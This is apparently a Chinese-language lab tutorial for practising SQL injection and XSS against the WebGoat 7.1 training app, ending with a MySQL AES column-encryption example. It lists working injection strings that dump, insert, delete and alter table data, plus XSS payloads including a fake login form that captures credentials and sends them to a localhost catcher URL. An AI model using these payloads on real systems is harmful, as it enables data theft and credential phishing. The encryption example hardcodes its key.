# SQL Injection 與 XSS攻擊手法
- 下載 Java
  - 網址：https://java.com/zh_TW/download/manual.jsp
  - 檔名：jre-8u281-windows-x64.exe
- 安裝 Java
  - 執行 jre-8u281-windows-x64.exe
- 下載 WebGoat 7.1
  - 網址：https://github.com/WebGoat/WebGoat/releases/tag/7.1
  - 檔名：webgoat-container-7.1-exec.jar
- 安裝 WebGoat 7.1
  - 開啟命令提示字元視窗並執行以下指令：
    - java -jar webgoat-container-7.1-exec.jar
  - 開啟 Chrome 瀏覽器輸入 http://localhost:8080/WebGoat
  - 登入帳號 guest 與通行碼 guest

## SQL Injection 測試步驟
- Numeric SQL Injection
  - 數字欄位(點選 Injection Flaws > Numeric SQL Injection)
  - 在網址列輸入 http://localhost:8080/WebGoat/start.mvc#attack/515/1100?Screen=75&menu=1200&station=101 or 1=1並檢視查詢的結果
- String SQL Injection
  - 文字欄位(點選 Injection Flaws > String SQL Injection)
  - 在 Last Name 欄位輸入「S' or '1'='1」or 「1' or '1'='1」並檢視查詢的結果
  - 在 Last Name 欄位輸入「alice';select * from salaries where '1'='1」並檢視查詢的結果
  - 在 Last Name 欄位輸入「alice';insert into salaries (userid,salary)values ('steven',100);select * from salaries where '1'='1」檢視增加的結果
  - 在 Last Name 欄位輸入「alice';delete from salaries where userid='steven」後，再重新輸入「jsmith' ; select * from salaries where '1'='1」並檢視刪除的結果
  - 在 Last Name 欄位輸入「alice' ; ALTER table salaries add temp char(255); select * from salaries where '1'='1」並檢視增加的結果

![String SQL Injection](./StringSQLI.png)
## XSS 測試步驟
- Stored XSS
  - 點選 Cross-Site Scripting(XSS) > Stored XSS Attack)
  - 在 Title 欄位輸入「<script>alert('XSS');</script>」並檢視顯示的結果
- Reflected XSS
  - 點選 Cross-Site Scripting(XSS) > Phishing with XSS)
  - 在 Search 欄位輸入「<script>alert('XSS');</script>」並檢視顯示的結果
  - Search 欄位輸入「<script>alert(document.cookie);</script>」並檢視顯示的 Cookie 值
  - 在 Search 欄位輸入下列資料，輸入完成後，檢視輸入「Account」與「Password」的結果
```
</form> 
<script> 
function hack(){ 
    var user = document.loginform.user.value; 
    var pass = document.loginform.pass.value; 
    alert("User:" + user + "\nPass:" + pass); 
    XSSImage=new Image;   
XSSImage.src="http://localhost/webgoat/catcher?PROPERTY
=yes&user="+ user + "&password=" + pass; 
}   
</script> 
<form name="loginform" ><br><br><HR> 
<H3>這個功能需要您的帳號登入(Please  input  your  account, 
again):</H3 ><br><br> 
Account:<br><input type="text" name="user"><br> 
Password:<br><input type="password" name = "pass"><br> 
<input  type="submit"  name="login"  value="login" 
onclick="hack()"> 
</form><br><br><HR>
```
# 資料表欄位加密
- 資料表範例
- 建立資料表
```sql
CREATE TABLE employee( 
name char(20), 
username varbinary(255), 
password varbinary(255) 
)
```
- 於資料表內建立資料，同時使用加密函數將機敏資料欄位加密
```sql
INSERT INTO employee (name, username, password) values 
("johnchang",AES_ENCRYPT("john","peter1234"), 
AES_ENCRYPT ("12345","peter1234")) 
```
- 顯示加密資料
```
SELECT *, AES_DECRYPT(username, 'peter1234') 
DECOE_username, AES_DECRYPT (password, 'peter1234') 
DECOE_password FROM employee
```
````
